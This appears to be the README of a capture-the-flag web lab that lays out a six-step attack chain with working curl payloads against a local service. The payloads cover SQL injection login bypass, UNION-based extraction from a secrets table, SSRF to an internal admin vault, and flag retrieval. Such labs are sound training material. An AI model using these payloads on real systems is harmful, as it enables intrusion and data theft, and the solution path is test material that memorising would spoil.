# Borealis Control Plane

## Goal

Exercise a richer mono-Pod web chain behind one public port:

1. support-data leak on `/api/reset`;
2. SQLi login bypass on `/api/login`;
3. SQLi exfiltration on `/api/projects`;
4. SSRF through `/api/render`;
5. internal-only admin path on `127.0.0.1:3001`;
6. final flag retrieval through `/api/import`.

The platform replaces the final `ALTAIR{...}` answer with a session-specific flag and injects it as `ALTAIR_FLAG_STEP_6`.

## Local Validation Path

```bash
curl -s -X POST http://127.0.0.1:3000/api/reset \
  -H 'Content-Type: application/json' \
  -d '{"email":"admin@borealis.local"}'
```

Login bypass example:

```bash
curl -s -c /tmp/borealis.cookies -X POST http://127.0.0.1:3000/api/login \
  -H 'Content-Type: application/json' \
  -d "{\"email\":\"admin@borealis.local' -- \",\"password\":\"x\"}"
```

Project exfiltration example:

```bash
curl -s "http://127.0.0.1:3000/api/projects?owner=' UNION SELECT 1,key,value FROM secrets -- "
```

SSRF example:

```bash
curl -s "http://127.0.0.1:3000/api/render?url=http://127.0.0.1:3001/admin/vault?token=NORTHSTAR-9000"
```

Final import:

```bash
curl -s -b /tmp/borealis.cookies "http://127.0.0.1:3000/api/import?cmd=read-flag"
```
